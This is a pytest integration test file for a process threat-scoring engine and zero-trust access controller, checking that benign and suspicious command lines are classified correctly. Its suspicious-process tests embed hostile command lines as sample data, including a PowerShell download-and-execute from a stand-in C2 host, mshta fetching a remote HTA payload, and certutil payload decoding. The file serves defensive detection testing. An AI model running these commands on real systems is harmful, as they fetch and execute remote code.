"""
tests/integration/test_process_pipeline.py
===========================================
Integration tests for the full process threat analysis pipeline:
  analyze_process() → Rule Engine → Memory Analyzer → Score Fusion → ZT Evaluation

Tests known safe processes, suspicious cmdlines, and full ZT pipeline routing.
"""

import sys
import os
import pytest
from pathlib import Path
sys.path.insert(0, str(Path(__file__).resolve().parents[2]))


@pytest.fixture(scope="module")
def engine():
    from engine.predictor import ABTDEngine
    return ABTDEngine()


@pytest.fixture(scope="module")
def zt_controller():
    try:
        from zero_trust.access_control.access_controller import AccessController
        return AccessController()
    except Exception:
        return None


# ═══════════════════════════════════════════════════════════════
# analyze_process() output structure
# ═══════════════════════════════════════════════════════════════

class TestProcessPipelineOutput:
    def test_returns_dict(self, engine):
        r = engine.analyze_process(os.getpid(), "python.exe", "")
        assert isinstance(r, dict)

    def test_required_fields(self, engine):
        r = engine.analyze_process(os.getpid(), "python.exe", "")
        for field in ("threat_score", "classification", "reasons", "timestamp"):
            assert field in r, f"Missing field: {field}"

    def test_score_bounded(self, engine):
        r = engine.analyze_process(os.getpid(), "python.exe", "")
        assert 0 <= r["threat_score"] <= 100

    def test_classification_valid(self, engine):
        r = engine.analyze_process(os.getpid(), "python.exe", "")
        assert r["classification"] in ("SAFE", "SUSPICIOUS", "MALICIOUS", "CRITICAL")


# ═══════════════════════════════════════════════════════════════
# Safe Processes
# ═══════════════════════════════════════════════════════════════

class TestSafeProcesses:
    def test_python_process_not_critical(self, engine):
        r = engine.analyze_process(os.getpid(), "python.exe", "python.exe tests/run.py")
        assert r["classification"] != "CRITICAL", "Normal Python test runner should not be CRITICAL"

    def test_notepad_safe(self, engine):
        r = engine.analyze_process(9999, "notepad.exe", "notepad.exe C:\\file.txt")
        assert r["threat_score"] < 50, f"notepad.exe should be low risk, got {r['threat_score']}"

    def test_chrome_safe(self, engine):
        r = engine.analyze_process(9998, "chrome.exe", "chrome.exe --no-sandbox")
        assert r["classification"] in ("SAFE", "SUSPICIOUS")


# ═══════════════════════════════════════════════════════════════
# Suspicious Processes
# ═══════════════════════════════════════════════════════════════

class TestSuspiciousProcesses:
    def test_powershell_encoded_high_risk(self, engine):
        r = engine.analyze_process(
            9001, "powershell.exe",
            "powershell.exe -EncodedCommand SGVsbG8gV29ybGQ= -nop -WindowStyle Hidden"
        )
        assert r["threat_score"] >= 40, \
            f"PS encoded + hidden should be high risk, got {r['threat_score']}"

    def test_certutil_download(self, engine):
        r = engine.analyze_process(
            9002, "cmd.exe",
            "cmd.exe /c certutil -decode payload.b64 payload.exe"
        )
        assert r["threat_score"] >= 20

    def test_mshta_hta(self, engine):
        r = engine.analyze_process(
            9003, "cmd.exe",
            "cmd.exe /c mshta.exe http://evil.xyz/payload.hta"
        )
        assert r["threat_score"] >= 20

    def test_iex_download_string(self, engine):
        r = engine.analyze_process(
            9004, "powershell.exe",
            "powershell -nop -c iex (New-Object Net.WebClient).DownloadString('http://c2.evil.com')"
        )
        assert r["threat_score"] >= 50

    def test_reasons_present_for_suspicious(self, engine):
        r = engine.analyze_process(
            9005, "powershell.exe",
            "powershell -EncodedCommand abc"
        )
        assert len(r["reasons"]) > 0


# ═══════════════════════════════════════════════════════════════
# ZT Pipeline Integration
# ═══════════════════════════════════════════════════════════════

class TestProcessZTPipeline:
    def test_zt_evaluate_safe_process(self, zt_controller):
        if not zt_controller:
            pytest.skip("ZT controller not available")
        result = zt_controller.evaluate_access({
            "event_type"   : "process",
            "resource"     : "notepad.exe",
            "action"       : "execute",
            "process_name" : "notepad.exe",
            "abtd_result"  : {"threat_score": 5, "classification": "SAFE"},
            "behavior_risk": 2.0,
        })
        assert result["decision"] in ("ALLOW", "MONITOR")

    def test_zt_evaluate_malicious_process(self, zt_controller):
        if not zt_controller:
            pytest.skip("ZT controller not available")
        result = zt_controller.evaluate_access({
            "event_type"   : "process",
            "resource"     : r"C:\Temp\payload.exe",
            "action"       : "execute",
            "process_name" : "payload.exe",
            "abtd_result"  : {"threat_score": 95, "classification": "CRITICAL"},
            "behavior_risk": 80.0,
        })
        assert result["decision"] in ("BLOCK", "QUARANTINE", "RESTRICT", "CHALLENGE"), \
            f"Malicious process should be blocked, got: {result['decision']}"

    def test_zt_result_has_decision(self, zt_controller):
        if not zt_controller:
            pytest.skip("ZT controller not available")
        result = zt_controller.evaluate_access({
            "event_type"   : "process",
            "resource"     : "python.exe",
            "abtd_result"  : {"threat_score": 5, "classification": "SAFE"},
            "behavior_risk": 0.0,
        })
        assert "decision" in result
        assert "overall_risk" in result
        assert "timestamp" in result
